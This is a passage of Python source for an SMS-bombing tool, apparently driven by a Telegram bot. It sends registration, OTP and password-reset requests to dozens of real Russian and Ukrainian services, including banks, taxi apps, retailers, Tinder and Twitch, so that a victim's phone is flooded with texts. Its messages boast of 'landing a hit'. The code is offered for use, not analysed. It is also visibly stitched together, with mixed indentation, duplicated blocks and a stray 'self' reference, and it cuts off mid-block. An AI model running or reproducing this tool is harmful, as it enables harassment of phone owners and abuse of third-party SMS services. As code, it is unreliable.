        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://cabinet.planetakino.ua/service/sms', params={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] PlanetaKino отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://ontaxi.com.ua/api/v2/web/client', json={"country": _codes[_code].upper(), "phone": _phone,})
            print('[@'+str(bot_username)+'] [+] OnTaxi отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
                
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] Iqos отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
            
        try:
            requests.post('https://smart.space/api/users/request_confirmation_code/', json={"mobile": "+" + _phone, "action": "confirm_mobile"})
            print('[@'+str(bot_username)+'] [+] Smart.Space отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={"phone": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] KFC отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
       
        try:
            requests.post('https://www.tarantino-family.com/wp-admin/admin-ajax.php', data={'action': 'ajax_register_user', 'step': '1', 'security_login': '50a8c243f6', 'phone': _phone})
            print('[@'+str(bot_username)+'] [+] tarantino-family отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://apteka.ru/_action/auth/getForm/', data={"form[NAME]": "","form[PERSONAL_GENDER]": "", "form[PERSONAL_BIRTHDAY]": "", "form[EMAIL]": "","form[LOGIN]": (_phone, "+* (***) ***-**-**"),"form[PASSWORD]": password,"get-new-password": "Получите пароль по SMS","user_agreement": "on","personal_data_agreement": "on","formType": "simple", "utc_offset": "120",})
            print('[@'+str(bot_username)+'] [+] Apteka отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://uklon.com.ua/api/v1/account/code/send', headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] Uklon отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://www.ozon.ru/api/composer-api.bx/_action/fastEntry', json={"phone": _phone, "otpId": 0})
            print('[@'+str(bot_username)+'] [+] Ozon отправлен!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.get('https://requests.service.banki.ru/form/960/submit', params={"callback": "submitCallback","name": _name,"phone": "+" + _phone,"email": _email,"gorod": "Москва","approving_data": "1",})
            print('[@'+str(bot_username)+'] [+] Banki отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] IVI отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://www.moyo.ua/identity/registration', data={"firstname": _name, "phone": _phone,"email":_email})
            print('[@'+str(bot_username)+'] [+] Moyo отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
       
        try:
            requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
            print('[@'+str(bot_username)+'] [+] Helsi отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [+] не отправлено!')
        
        try:
            requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"}, json={"Phone": _phone, "Type": 1})
            print('[@'+str(bot_username)+'] [+] KinoLend отправлен!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
            print('[@'+str(bot_username)+'] [+] PizzaHut sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
            print('[@'+str(bot_username)+'] [+] Rabota sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
            print('[@'+str(bot_username)+'] [+] Rutube sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] Rutube in sent!')
     
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
            print('[@'+str(bot_username)+'] [+] Citilink sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
            print('[@'+str(bot_username)+'] [+] Smsint sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
            print('[@'+str(bot_username)+'] [+] oyorooms sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode', params={"pageName":"registerPrivateUserPhoneVerificatio"}, data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": "",})
            print('[@'+str(bot_username)+'] [+] MVIDEO sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
            print('[@'+str(bot_username)+'] [+] newnext sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            print('[@'+str(bot_username)+'] [+] Sunlight sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
            print('[@'+str(bot_username)+'] [+] alpari sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            print('[@'+str(bot_username)+'] [+] Invitro sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
            print('[@'+str(bot_username)+'] [+] Sberbank sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
            print('[@'+str(bot_username)+'] [+] Psbank sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
            print('[@'+str(bot_username)+'] [+] Beltelcom sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
            print('[@'+str(bot_username)+'] [+] Karusel sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
            print('[@'+str(bot_username)+'] [+] KFC sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://api.chef.yandex/api/v2/auth/sms', json={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] Yandex.Chef sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code', params={"msisdn": _phone})
            print('[@'+str(bot_username)+'] [+] MTS отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post("https://api.delitime.ru/api/v2/signup", data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
            print('[@'+str(bot_username)+'] [+] Delitime sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
            print('[@'+str(bot_username)+'] [+] findclone звонок отправлен!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post("https://guru.taxi/api/v1/driver/session/verify", json={"phone": {"code": 1, "number": _phone}})
            print('[@'+str(bot_username)+'] [+] Guru sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php', data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            print('[@'+str(bot_username)+'] [+] ICQ sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru", data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
            print('[@'+str(bot_username)+'] [+] InDriver sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://lk.invitro.ru/sp/mobileApi/createUserByPassword', data={"password": password,"application": "lkp","login": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] Invitro отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] Pmsm sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] IVI sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
            print('[@'+str(bot_username)+'] [+] Lenta sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink', json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
            print('[@'+str(bot_username)+'] [+] Mail.ru sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode', params={"pageName": "registerPrivateUserPhoneVerificatio"}, data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
            print('[@'+str(bot_username)+'] [+] MVideo sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data={"st.r.phone": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] OK sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] qlean sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')
            
        try:
            requests.post('https://sso.cloud.qlean.ru/http/users/requestotp', headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"}, params={"phone": _phone, "clientId":"undefined", "sessionId": str(randint(5000, 9999))})
            print('[@'+str(bot_username)+'] [+] Qlean отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
            print('[@'+str(bot_username)+'] [+] SMSgorod sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone})
            print('[@'+str(bot_username)+'] [+] Tinder sent!')
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true', json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
            print('[@'+str(bot_username)+'] [+] Twitch sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
            print('[@'+str(bot_username)+'] [+] CabWiFi sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
            print('[@'+str(bot_username)+'] [+] wowworks sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={"phone_number": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] Eda.Yandex sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            print('[@'+str(bot_username)+'] [+] Youla sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
            print('[@'+str(bot_username)+'] [+] Alpari sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] SMS sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] Delivery sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

         try:
		requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')
	try:
		requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
		print(Fore.GREEN + 'Вы успешно нанесли удар!!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}})
		print(Fore.GREEN + 'Вы успешно нанесли удар!!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://plink.tech/register/',json={"phone": _phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')

	try:
		requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')
	try:
		requests.post('https://bmp.megafon.tv/api/v10/auth/register/msisdn',json={"msisdn":_phone,"password":passmegafon})
		print(Fore.GREEN + 'Вы успешно нанесли удар!')
	except:
		print(Fore.RED + 'Вы получили по ебалу!')
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://zoloto585.ru/api/bcard/reg/", json={"name":"","surname":"","patronymic":"","sex":"m","birthdate":"..","phone":phonemas,"email":"","city":""})
    except:
        pass
    try:
        requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": phone})
    except:
        pass
    try:
        phonemas=mask(str=phone[1:], maska="8(###)###-##-##")
        requests.post("http://xn---72-5cdaa0cclp5fkp4ewc.xn--p1ai/user_account/ajax222.php?do=sms_code",data={"phone": phonemas})
    except:
        pass
    try:
        requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": phone})
    except:
        pass
    try:
